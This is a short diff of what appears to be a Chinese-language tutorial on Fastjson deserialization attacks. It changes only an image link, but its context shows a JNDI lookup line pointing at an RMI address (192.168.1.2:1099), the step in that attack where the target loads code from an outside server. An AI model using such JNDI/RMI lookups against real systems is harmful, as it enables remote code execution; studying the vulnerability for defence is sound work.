@@ -295,7 +295,7 @@ JSON.parse(payload);
 DataSource var2 = (DataSource)var1.lookup("rmi://192.168.1.2:1099/jvelrl");
 ```
 
-![image-20260314155602429](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314155602429.png)
+![image-20260316092511008](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316092511008.png)
 
 创建项目FastJsonServletDemo，引入依赖项fastjson。
 
